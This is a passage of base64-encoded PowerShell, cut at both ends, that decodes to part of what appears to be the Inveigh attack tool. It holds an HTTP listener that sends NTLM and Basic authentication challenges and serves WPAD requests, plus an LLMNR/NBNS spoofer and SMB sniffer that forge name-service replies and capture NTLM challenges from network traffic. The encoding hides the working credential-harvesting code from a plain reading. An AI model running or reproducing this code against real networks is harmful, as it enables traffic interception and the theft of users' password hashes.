g2ZSwweDc0LDB4MmQsMHg1NCwweDc5LDB4NzAsMHg2NSwweDNhLDB4MjAgKyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJhcHBsaWNhdGlvbi94LW5zLXByb3h5LWF1dG9jb25maWciKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJEhUVFBSZXNwb25zZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX21lc3NhZ2UgPSAkSFRUUFJlc3BvbnNlCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigkSFRUUENvbnRlbnRUeXBlKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfY29udGVudF90eXBlID0gMHg0MywweDZmLDB4NmUsMHg3NCwweDY1LDB4NmUsMHg3NCwweDJkLDB4NTQsMHg3OSwweDcwLDB4NjUsMHgzYSwweDIwICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSFRUUENvbnRlbnRUeXBlKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kSFRUUF9tZXNzYWdlX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSFRUUF9tZXNzYWdlKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtCeXRlW11dJEhUVFBfbWVzc2FnZV9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEhUVFBfbWVzc2FnZSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gR2V0LURhdGUgLWZvcm1hdCByCiAgICAgICAgICAgICRIVFRQX3RpbWVzdGFtcCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEhUVFBfdGltZXN0YW1wKQogICAgICAgICAgICAkSFRUUF9oZWFkZXJfY29udGVudF9sZW5ndGggPSAweDQzLDB4NmYsMHg2ZSwweDc0LDB4NjUsMHg2ZSwweDc0LDB4MmQsMHg0YywweDY1LDB4NmUsMHg2NywweDc0LDB4NjgsMHgzYSwweDIwICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSFRUUF9tZXNzYWdlX2J5dGVzLkxlbmd0aCkKCiAgICAgICAgICAgIGlmKCgkSFRUUEF1dGggLWxpa2UgJ05UTE0qJyAtYW5kICRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbm90bWF0Y2ggJy93cGFkLmRhdCcpIC1vciAoJFdQQURBdXRoIC1saWtlICdOVExNKicgLWFuZCAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgLW1hdGNoICcvd3BhZC5kYXQnKSAtYW5kICEkSFRUUF9jbGllbnRfY2xvc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGVfZGF0YSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJE5UTE0pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCgkSFRUUEF1dGggLWVxICdCYXNpYycgLWFuZCAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgLW5vdG1hdGNoICcvd3BhZC5kYXQnKSAtb3IgKCRXUEFEQXV0aCAtZXEgJ0Jhc2ljJyAtYW5kICRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbWF0Y2ggJy93cGFkLmRhdCcpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aGVudGljYXRlX2RhdGEgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJCYXNpYyByZWFsbT0kSFRUUEJhc2ljUmVhbG0iKQogICAgICAgICAgICB9CgogICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX1JlcXVlc3RWZXJzaW9uIixbQnl0ZVtdXSgweDQ4LDB4NTQsMHg1NCwweDUwLDB4MmYsMHgzMSwweDJlLDB4MzEsMHgyMCkpCiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX1N0YXR1c0NvZGUiLCRIVFRQX3Jlc3BvbnNlX3N0YXR1c19jb2RlICsgW0J5dGVbXV0oMHgyMCkpCiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX1Jlc3BvbnNlUGhyYXNlIiwkSFRUUF9yZXNwb25zZV9waHJhc2UgKyBbQnl0ZVtdXSgweDBkLDB4MGEpKQogICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZS5BZGQoIkhUVFBSZXNwb25zZV9TZXJ2ZXIiLFtCeXRlW11dKDB4NTMsMHg2NSwweDcyLDB4NzYsMHg2NSwweDcyLDB4M2EsMHgyMCwweDRkLDB4NjksMHg2MywweDcyLDB4NmYsMHg3MywweDZmLDB4NjYsMHg3NCwweDJkLDB4NDgsMHg1NCwweDU0LDB4NTAsMHg0MSwweDUwLDB4NDksMHgyZiwweDMyLDB4MmUsMHgzMCwweDBkLDB4MGEpKQogICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZS5BZGQoIkhUVFBSZXNwb25zZV9UaW1lU3RhbXAiLFtCeXRlW11dKDB4NDQsMHg2MSwweDc0LDB4NjUsMHgzYSwweDIwKSArICRIVFRQX3RpbWVzdGFtcCArIFtCeXRlW11dKDB4MGQsMHgwYSkpCiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX0NvbnRlbnRMZW5ndGgiLCRIVFRQX2hlYWRlcl9jb250ZW50X2xlbmd0aCArIFtCeXRlW11dKDB4MGQsMHgwYSkpCgogICAgICAgICAgICBpZigkSFRUUF9oZWFkZXJfYXV0aGVudGljYXRlIC1hbmQgJEhUVFBfaGVhZGVyX2F1dGhlbnRpY2F0ZV9kYXRhKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZS5BZGQoIkhUVFBSZXNwb25zZV9BdXRoZW50aWNhdGVIZWFkZXIiLCRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGUgKyAkSFRUUF9oZWFkZXJfYXV0aGVudGljYXRlX2RhdGEgKyBbQnl0ZVtdXSgweDBkLDB4MGEpKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkSFRUUF9oZWFkZXJfY29udGVudF90eXBlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZS5BZGQoIkhUVFBSZXNwb25zZV9Db250ZW50VHlwZSIsJEhUVFBfaGVhZGVyX2NvbnRlbnRfdHlwZSArIFtCeXRlW11dKDB4MGQsMHgwYSkpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRIVFRQX2hlYWRlcl9jYWNoZV9jb250cm9sKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZS5BZGQoIkhUVFBSZXNwb25zZV9DYWNoZUNvbnRyb2wiLCRIVFRQX2hlYWRlcl9jYWNoZV9jb250cm9sICsgW0J5dGVbXV0oMHgwZCwweDBhKSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJEhUVFBfc2VuZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHBhY2tldF9IVFRQUmVzcG9uc2UuQWRkKCJIVFRQUmVzcG9uc2VfTWVzc2FnZSIsW0J5dGVbXV0oMHgwZCwweDBhKSArICRIVFRQX21lc3NhZ2VfYnl0ZXMpCiAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfSFRUUFJlc3BvbnNlCiAgICAgICAgICAgICAgICAkSFRUUF9zdHJlYW0uV3JpdGUoJEhUVFBfcmVzcG9uc2UsMCwkSFRUUF9yZXNwb25zZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAkSFRUUF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICB9CgogICAgICAgICAgICBTdGFydC1TbGVlcCAtbSAxMAogICAgICAgICAgICAkSFRUUF9yZXF1ZXN0X3Jhd19VUkxfb2xkID0gJEhUVFBfcmVxdWVzdF9yYXdfVVJMCiAgICAgICAgICAgICRIVFRQX2NsaWVudF9oYW5kbGVfb2xkID0gJEhUVFBfY2xpZW50LkNsaWVudC5IYW5kbGUKCiAgICAgICAgICAgIGlmKCRIVFRQX2NsaWVudF9jbG9zZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfcmVzZXRfZGVsYXkgPSAkZmFsc2UKCiAgICAgICAgICAgICAgICBpZigkcHJveHlfbGlzdGVuZXIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50LkNsaWVudC5DbG9zZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CgogICAgICAgICAgICBpZigkSFRUUF9kYXRhX2F2YWlsYWJsZSAtb3IgISRIVFRQX3Jlc2V0X2RlbGF5IC1vciAkSFRUUF9yZXNldF9kZWxheV9zdG9wd2F0Y2guRWxhcHNlZCAtZ2UgJEhUVFBfcmVzZXRfZGVsYXlfdGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudF9jbG9zZSA9ICR0cnVlCiAgICAgICAgICAgICAgICAkSFRUUF9yZXNldF9kZWxheSA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gMTAwCiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgCiAgICB9CgogICAgJEhUVFBfY2xpZW50LkNsb3NlKCkKICAgIHN0YXJ0LXNsZWVwIC1zIDEKICAgICRIVFRQX2xpc3RlbmVyLlNlcnZlci5CbG9ja2luZyA9ICRmYWxzZQogICAgU3RhcnQtU2xlZXAgLXMgMQogICAgJEhUVFBfbGlzdGVuZXIuU2VydmVyLkNsb3NlKCkKICAgIFN0YXJ0LVNsZWVwIC1zIDEKICAgICRIVFRQX2xpc3RlbmVyLlN0b3AoKQp9CgojIFNuaWZmZXIvU3Bvb2ZlciBTY3JpcHRCbG9jayAtIExMTU5SL05CTlMgU3Bvb2ZlciBhbmQgU01CIHNuaWZmZXIKJHNuaWZmZXJfc2NyaXB0YmxvY2sgPSAKewogICAgcGFyYW0gKCRJUCwkTExNTlIsJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UsJExMTU5SVFRMLCRtRE5TLCRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UsJG1ETlNUeXBlcywkbUROU1RUTCwkTkJOUywkTkJOU19yZXNwb25zZV9tZXNzYWdlLCROQk5TVHlwZXMsJE5CTlNUVEwsJFNNQiwkU3Bvb2Zlckhvc3RzSWdub3JlLCRTcG9vZmVySG9zdHNSZXBseSwkU3Bvb2ZlcklQLCRTcG9vZmVySVBzSWdub3JlLCRTcG9vZmVySVBzUmVwbHksCiAgICAgICAgICAgICRTcG9vZmVyTGVhcm5pbmcsJFNwb29mZXJMZWFybmluZ0RlbGF5LCRTcG9vZmVyTGVhcm5pbmdJbnRlcnZhbCkKCiAgICAkc25pZmZlcl9ydW5uaW5nID0gJHRydWUKICAgICRieXRlX2luID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDQJCiAgICAkYnl0ZV9vdXQgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNAkKICAgICRieXRlX2RhdGEgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNDA5NgogICAgJGJ5dGVfaW5bMF0gPSAxCiAgICAkYnl0ZV9pblsxLTNdID0gMAogICAgJGJ5dGVfb3V0WzBdID0gMQogICAgJGJ5dGVfb3V0WzEtM10gPSAwCiAgICAkc25pZmZlcl9zb2NrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXQoW05ldC5Tb2NrZXRzLkFkZHJlc3NGYW1pbHldOjpJbnRlck5ldHdvcmssW05ldC5Tb2NrZXRzLlNvY2tldFR5cGVdOjpSYXcsW05ldC5Tb2NrZXRzLlByb3RvY29sVHlwZV06OklQKQogICAgJHNuaWZmZXJfc29ja2V0LlNldFNvY2tldE9wdGlvbigiSVAiLCJIZWFkZXJJbmNsdWRlZCIsJHRydWUpCiAgICAkc25pZmZlcl9zb2NrZXQuUmVjZWl2ZUJ1ZmZlclNpemUgPSA0MDk2CgogICAgdHJ5CiAgICB7CiAgICAgICAgJGVuZF9wb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZHBvaW50KFtTeXN0ZW0uTmV0LklQQWRkcmVzc10iJElQIiwwKQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBFcnJvciBzdGFydGluZyBzbmlmZmVyL3Nwb29mZXIiKQogICAgICAgICRzbmlmZmVyX3J1bm5pbmcgPSAkZmFsc2UKCiAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgc25pZmZlci9zcG9vZmVyIikKICAgICAgICB9CgogICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEVycm9yIHN0YXJ0aW5nIHNuaWZmZXIvc3Bvb2ZlciIpCiAgICAgICAgfQoKICAgIH0KCiAgICAkc25pZmZlcl9zb2NrZXQuQmluZCgkZW5kX3BvaW50KQogICAgJHNuaWZmZXJfc29ja2V0LklPQ29udHJvbChbU3lzdGVtLk5ldC5Tb2NrZXRzLklPQ29udHJvbENvZGVdOjpSZWNlaXZlQWxsLCRieXRlX2luLCRieXRlX291dCkKICAgICRMTE1OUl9UVExfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRMTE1OUlRUTCkKICAgIFtBcnJheV06OlJldmVyc2UoJExMTU5SX1RUTF9ieXRlcykKICAgICRtRE5TX1RUTF9ieXRlcyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJG1ETlNUVEwpCiAgICBbQXJyYXldOjpSZXZlcnNlKCRtRE5TX1RUTF9ieXRlcykKICAgICROQk5TX1RUTF9ieXRlcyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJE5CTlNUVEwpCiAgICBbQXJyYXldOjpSZXZlcnNlKCROQk5TX1RUTF9ieXRlcykKICAgICRMTE1OUl9sZWFybmluZ19sb2cgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJE5CTlNfbGVhcm5pbmdfbG9nID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10KCiAgICBpZigkU3Bvb2ZlckxlYXJuaW5nRGVsYXkpCiAgICB7ICAgIAogICAgICAgICRzcG9vZmVyX2xlYXJuaW5nX2RlbGF5ID0gTmV3LVRpbWVTcGFuIC1NaW51dGVzICRTcG9vZmVyTGVhcm5pbmdEZWxheQogICAgICAgICRzcG9vZmVyX2xlYXJuaW5nX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgfQoKICAgIHdoaWxlKCRpbnZlaWdoLnJ1bm5pbmcgLWFuZCAkc25pZmZlcl9ydW5uaW5nKQogICAgewogICAgICAgICRwYWNrZXRfZGF0YSA9ICRzbmlmZmVyX3NvY2tldC5SZWNlaXZlKCRieXRlX2RhdGEsMCwkYnl0ZV9kYXRhLkxlbmd0aCxbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSkKICAgICAgICAkbWVtb3J5X3N0cmVhbSA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgkYnl0ZV9kYXRhLDAsJHBhY2tldF9kYXRhKQogICAgICAgICRiaW5hcnlfcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uQmluYXJ5UmVhZGVyKCRtZW1vcnlfc3RyZWFtKQogICAgICAgICR2ZXJzaW9uX0hMID0gJGJpbmFyeV9yZWFkZXIuUmVhZEJ5dGUoKQogICAgICAgICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlKCkgPiAkbnVsbAogICAgICAgICR0b3RhbF9sZW5ndGggPSBEYXRhVG9VSW50MTYgJGJpbmFyeV9yZWFkZXIuUmVhZEJ5dGVzKDIpCiAgICAgICAgJGJpbmFyeV9yZWFkZXIuUmVhZEJ5dGVzKDUpID4gJG51bGwKICAgICAgICAkcHJvdG9jb2xfbnVtYmVyID0gJGJpbmFyeV9yZWFkZXIuUmVhZEJ5dGUoKQogICAgICAgICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcygyKSA+ICRudWxsCiAgICAgICAgJHNvdXJjZV9JUF9ieXRlcyA9ICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcyg0KQogICAgICAgICRzb3VyY2VfSVAgPSBbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJHNvdXJjZV9JUF9ieXRlcwogICAgICAgICRkZXN0aW5hdGlvbl9JUF9ieXRlcyA9ICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcyg0KQogICAgICAgICRkZXN0aW5hdGlvbl9JUCA9IFtTeXN0ZW0uTmV0LklQQWRkcmVzc10kZGVzdGluYXRpb25fSVBfYnl0ZXMKICAgICAgICAkaGVhZGVyX2xlbmd0aCA9IFtJbnRdIjB4JCgoJ3swOlh9JyAtZiAkdmVyc2lvbl9ITClbMV0pIiAqIDQKICAgICAgICAKICAgICAgICBzd2l0Y2goJHByb3RvY29sX251bWJlcikKICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICA2IAogICAgICAgICAgICB7ICAjIFRDUAogICAgICAgICAgICAgICAgJHNvdXJjZV9wb3J0ID0gRGF0YVRvVUludDE2ICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcygyKQogICAgICAgICAgICAgICAgJGRlc3RpbmF0aW9uX3BvcnQgPSBEYXRhVG9VSW50MTYgJGJpbmFyeV9yZWFkZXIuUmVhZEJ5dGVzKDIpCiAgICAgICAgICAgICAgICAkYmluYXJ5X3JlYWRlci5SZWFkQnl0ZXMoOCkgPiAkbnVsbAogICAgICAgICAgICAgICAgJFRDUF9oZWFkZXJfbGVuZ3RoID0gW0ludF0iMHgkKCgnezA6WH0nIC1mICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlKCkpWzBdKSIgKiA0CiAgICAgICAgICAgICAgICAkYmluYXJ5X3JlYWRlci5SZWFkQnl0ZXMoNykgPiAkbnVsbAogICAgICAgICAgICAgICAgJHBheWxvYWRfYnl0ZXMgPSAkYmluYXJ5X3JlYWRlci5SZWFkQnl0ZXMoJHRvdGFsX2xlbmd0aCAtICgkaGVhZGVyX2xlbmd0aCArICRUQ1BfaGVhZGVyX2xlbmd0aCkpCgogICAgICAgICAgICAgICAgc3dpdGNoICgkZGVzdGluYXRpb25fcG9ydCkKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgMTM5IAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQiAtZXEgJ1knKQogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fY2hhbGxlbmdlIC1hbmQgJGNsaWVudF9JUCAtZXEgJHNvdXJjZV9JUCAtYW5kICRjbGllbnRfcG9ydCAtZXEgJHNvdXJjZV9wb3J0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNNQk5UTE1SZXNwb25zZSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjbGllbnRfSVAgPSAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNsaWVudF9wb3J0ID0gIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICIiCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICA0NDUKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CIC1lcSAnWScpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkTlRMTV9jaGFsbGVuZ2UgLWFuZCAkY2xpZW50X0lQIC1lcSAkc291cmNlX0lQIC1hbmQgJGNsaWVudF9wb3J0IC1lcSAkc291cmNlX3BvcnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU01CTlRMTVJlc3BvbnNlICRwYXlsb2FkX2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNsaWVudF9JUCA9ICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2xpZW50X3BvcnQgPSAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gIiIKCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgT3V0Z29pbmcgcGFja2V0cwogICAgICAgICAgICAgICAgc3dpdGNoICgkc291cmNlX3BvcnQpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIDEzOSAKICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CIC1lcSAnWScpCiAgICAgICAgICAgICAgICAgICAgICAgIHsgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjbGllbnRfSVAgPSAkZGVzdGluYXRpb25fSVAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2xpZW50X3BvcnQgPSAkZGVzdGluYXRpb25fcG9ydAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gU01CTlRMTUNoYWxsZW5nZSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICA0NDUgCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQiAtZXEgJ1knKQogICAgICAgICAgICAgICAgICAgICAgICB7ICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2xpZW50X0lQID0gJGRlc3RpbmF0aW9uX0lQIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNsaWVudF9wb3J0ID0gJGRlc3RpbmF0aW9uX3BvcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9IFNNQk5UTE1DaGFsbGVuZ2UgJHBheWxvYWRfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIDE3IAogICAgICAgICAgICB7ICAjIFVEUAogICAgICAgICAgICAgICAgJHNvdXJjZV9wb3J0ID0gJGJpbmFyeV9yZWFkZXIuUmVhZEJ5dGVzKDIpCiAgICAgICAgICAgICAgICAkZW5kcG9pbnRfc291cmNlX3BvcnQgPSBEYXRhVG9VSW50MTYgKCRzb3VyY2VfcG9ydCkKICAgICAgICAgICAgICAgICRkZXN0aW5hdGlvbl9wb3J0ID0gRGF0YVRvVUludDE2ICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcygyKQogICAgICAgICAgICAgICAgJFVEUF9sZW5ndGggPSAkYmluYXJ5X3JlYWRlci5SZWFkQnl0ZXMoMikKICAgICAgICAgICAgICAgICRVRFBfbGVuZ3RoX3VpbnQgID0gRGF0YVRvVUludDE2ICgkVURQX2xlbmd0aCkKICAgICAgICAgICAgICAgICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcygyKSA+ICRudWxsCiAgICAgICAgICAgICAgICAkcGF5bG9hZF9ieXRlcyA9ICRiaW5hcnlfcmVhZGVyLlJlYWRCeXRlcygoJFVEUF9sZW5ndGhfdWludCAtIDIpICogNCkKCiAgICAgICAgICAgICAgICAjIEluY29taW5nIHBhY2tldHMgCiAgICAgICAgICAgICAgICBzd2l0Y2goJGRlc3RpbmF0aW9uX3BvcnQpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIDEzNyAjIE5CTlMKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlc1s0Li43XSkgLWVxICcwMC0wMS0wMC0wMCcgLW9yIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbNC4uN10pIC1lcSAnMDAtMDAtMDAtMDEnKSAtYW5kIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbMTAuLjExXSkgLW5lICcwMC0wMScpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVRFBfbGVuZ3RoWzBdICs9IDEyCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfZGF0YSA9ICRwYXlsb2FkX2J5dGVzWzEzLi4kcGF5bG9hZF9ieXRlcy5MZW5ndGhdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX1RUTF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDYsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdW1N0cmluZ10oW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRTcG9vZmVySVApKS5HZXRBZGRyZXNzQnl0ZXMoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9wYWNrZXQgPSAweDAwLDB4ODkgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNvdXJjZV9wb3J0WzEsMF0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVEUF9sZW5ndGhbMSwwXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg